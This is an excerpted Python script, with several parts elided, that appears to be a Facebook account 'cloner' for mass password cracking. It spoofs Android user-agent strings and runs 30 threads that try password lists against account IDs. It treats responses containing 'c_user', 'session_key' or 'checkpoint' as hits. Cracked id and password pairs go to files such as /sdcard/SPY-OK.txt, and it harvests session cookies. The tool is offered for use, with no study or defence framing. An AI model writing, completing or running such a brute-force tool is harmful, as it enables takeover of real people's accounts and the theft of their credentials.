...
for agent in range(10000):
        ...
        c='Android 8.1.0; fr-fr; 5033F Build/'
        ...
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 PHX/11.4'
...
def Spy():
	...
	print(f" [2] NIGERIA RANDOM CLONER ")
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print("\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			print(f'\33[1;32m Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                open(f'/sdcard/FARM-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m[Cracking] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                     ...
                     #   family_device_id = uuid.uuid4()
                      ...
                      #  xfb_device = str(random.randint(1111, 9999))
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m[Successful] %s | %s'%(ids,pas,))
                                #cek_apk(sessioncok[Checkpoint]
                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;91m[Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m[Successful] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
